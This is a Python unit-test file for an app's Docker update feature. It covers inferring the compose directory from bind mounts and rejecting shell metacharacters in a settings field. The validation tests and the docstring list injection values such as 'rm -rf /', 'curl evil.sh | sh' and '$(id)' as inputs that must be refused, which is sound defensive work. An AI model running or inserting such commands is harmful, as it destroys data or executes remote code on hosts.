"""The compose directory shown in the Docker update command (upstream #2664).

``docker compose pull`` only works from the directory holding the compose file,
which is precisely the thing somebody reading the update box does not know.
Compose itself knows — it stamps ``com.docker.compose.project.working_dir`` onto
every container it creates — but ⚠️ reading your own labels needs the Docker
socket mounted in, which is root-equivalent access to the host in exchange for a
convenience string. So it is inferred from a bind mount, and treated as a guess:
it only ever prefills a field the operator can overwrite.

⚠️ This is also the one setting whose entire purpose is to be pasted into a
root-capable shell. ``/opt/bamdude; rm -rf /`` would render as a perfectly
plausible update command, so anyone holding ``settings:update`` could hand every
admin a destructive one-liner. Hence the character restriction.
"""

from __future__ import annotations

import pytest

from backend.app.api.routes.updates import _compose_dir_from_mountinfo, _detect_compose_dir
from backend.app.schemas.settings import AppSettingsUpdate

pytestmark = pytest.mark.unit


def _mountinfo(tmp_path, lines: list[str], monkeypatch):
    path = tmp_path / "mountinfo"
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    real_open = open

    def fake_open(name, *args, **kwargs):
        if name == "/proc/self/mountinfo":
            return real_open(path, *args, **kwargs)
        return real_open(name, *args, **kwargs)

    monkeypatch.setattr("builtins.open", fake_open)


class TestGuessingFromABindMount:
    def test_a_relative_bind_mount_names_its_parent(self, tmp_path, monkeypatch):
        """``./data:/app/data`` surfaces as ``/opt/bamdude/data``; the compose
        file is one level up."""
        _mountinfo(
            tmp_path,
            ["31 25 0:24 /opt/bamdude/data /app/data rw,relatime - ext4 /dev/sda1 rw"],
            monkeypatch,
        )

        assert _compose_dir_from_mountinfo() == "/opt/bamdude"

    def test_an_unrelated_bind_mount_is_not_a_compose_directory(self, tmp_path, monkeypatch):
        """⚠️ The leaf has to match the mount point's own name. A NAS share
        mounted at /app/data says nothing about where the compose file is —
        taking its parent would print ``cd /mnt/nas`` with confidence."""
        _mountinfo(
            tmp_path,
            ["31 25 0:24 /mnt/nas/prints /app/data rw,relatime - nfs4 nas:/prints rw"],
            monkeypatch,
        )

        assert _compose_dir_from_mountinfo() is None

    def test_a_named_volume_reveals_nothing(self, tmp_path, monkeypatch):
        """It names the compose PROJECT, not the directory — and the shipped
        compose file uses named volumes, so this is the common case."""
        _mountinfo(
            tmp_path,
            ["31 25 0:24 /var/lib/docker/volumes/bamdude_bamdude_data/_data /app/data rw,relatime - ext4 /dev/sda1 rw"],
            monkeypatch,
        )

        assert _compose_dir_from_mountinfo() is None

    def test_mounts_that_are_not_ours_are_ignored(self, tmp_path, monkeypatch):
        _mountinfo(
            tmp_path,
            [
                "29 25 0:24 /home/me/models /app/library rw,relatime - ext4 /dev/sda1 rw",
                "30 25 0:24 /etc/hosts /etc/hosts rw,relatime - ext4 /dev/sda1 rw",
            ],
            monkeypatch,
        )

        assert _compose_dir_from_mountinfo() is None

    def test_the_logs_mount_works_too(self, tmp_path, monkeypatch):
        _mountinfo(
            tmp_path,
            ["31 25 0:24 /srv/bamdude/logs /app/logs rw,relatime - ext4 /dev/sda1 rw"],
            monkeypatch,
        )

        assert _compose_dir_from_mountinfo() == "/srv/bamdude"

    def test_no_mountinfo_at_all(self, monkeypatch):
        """Not Linux, or a kernel without it. Not an error — just no guess."""
        real_open = open

        def fake_open(name, *args, **kwargs):
            if name == "/proc/self/mountinfo":
                raise OSError("nope")
            return real_open(name, *args, **kwargs)

        monkeypatch.setattr("builtins.open", fake_open)

        assert _compose_dir_from_mountinfo() is None


class TestWhatBeatsTheGuess:
    def test_the_environment_variable_wins(self, monkeypatch):
        """⚠️ The only source that is STATED rather than inferred, so it is not
        second-guessed — not even by asking whether we are in a container."""
        monkeypatch.setenv("BAMDUDE_COMPOSE_DIR", "/opt/stacks/bamdude")
        monkeypatch.setattr("backend.app.api.routes.updates._is_docker_environment", lambda: False)

        assert _detect_compose_dir() == "/opt/stacks/bamdude"

    def test_an_empty_variable_is_not_an_answer(self, monkeypatch):
        monkeypatch.setenv("BAMDUDE_COMPOSE_DIR", "   ")
        monkeypatch.setattr("backend.app.api.routes.updates._is_docker_environment", lambda: False)

        assert _detect_compose_dir() is None

    def test_nothing_is_guessed_outside_a_container(self, monkeypatch):
        monkeypatch.delenv("BAMDUDE_COMPOSE_DIR", raising=False)
        monkeypatch.setattr("backend.app.api.routes.updates._is_docker_environment", lambda: False)

        assert _detect_compose_dir() is None


class TestTheFieldCannotCarryAShellCommand:
    @pytest.mark.parametrize(
        "value",
        [
            "/opt/bamdude; rm -rf /",
            "/opt/bamdude && curl evil.sh | sh",
            "$(id)",
            "`id`",
            "/opt/bamdude\ncd /",
            '/opt/bamdude" && rm -rf / #',
        ],
    )
    def test_it_refuses_anything_that_is_not_a_path(self, value):
        with pytest.raises(ValueError):
            AppSettingsUpdate(docker_compose_dir=value)

    def test_it_refuses_a_trailing_backslash(self):
        """⚠️ The one survivor that would still break the double-quoting the
        frontend uses for paths with spaces: it escapes the closing quote and
        swallows the rest of the line."""
        with pytest.raises(ValueError):
            AppSettingsUpdate(docker_compose_dir="C:\\bamdude\\")

    def test_it_refuses_an_absurdly_long_value(self):
        with pytest.raises(ValueError):
            AppSettingsUpdate(docker_compose_dir="/" + "a" * 600)

    @pytest.mark.parametrize(
        "value",
        [
            "/opt/bamdude",
            "/opt/bam dude",
            "/home/me/.local/stacks/bamdude",
            "~/bamdude",
            "C:\\Users\\me\\bamdude",
            "/srv/bamdude/",
        ],
    )
    def test_it_accepts_a_real_path(self, value):
        assert AppSettingsUpdate(docker_compose_dir=value).docker_compose_dir == value

    def test_empty_is_allowed_and_means_use_the_guess(self):
        assert AppSettingsUpdate(docker_compose_dir="").docker_compose_dir == ""
